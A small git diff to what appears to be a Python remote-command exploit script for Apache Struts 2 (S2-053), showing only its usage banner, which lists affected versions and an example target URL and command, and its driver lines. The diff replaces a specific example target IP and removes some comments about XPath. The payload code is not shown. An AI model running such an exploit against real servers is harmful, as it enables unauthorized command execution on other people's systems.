@@ -17,7 +17,7 @@ if __name__=='__main__':
     if len(sys.argv)!=3:
         print('+-------------------------------------------------------------------------------+')
         print('+ USE: python3 <filename> <url> <command>                                       +')
-        print('+ EXP: python3 struts2-053_command.py http://182.61.16.221:9053/hello.action id +')
+        print('+ EXP: python3 struts2-053_command.py http://1.1.1.1:7001/hello.action id       +')
         print('+ VER: Struts 2.0.1-2.3.33                                                      +')
         print('+      Struts 2.5-2.5.10                                                        +')
         print('+-------------------------------------------------------------------------------+')
@@ -29,7 +29,3 @@ if __name__=='__main__':
     attack=Exploit()
     attack.exp(url,cmd)
 
-
-#  * 	匹配任何元素节点。
-# @*	匹配任何属性节点。
-# node()	匹配任何类型的节点。
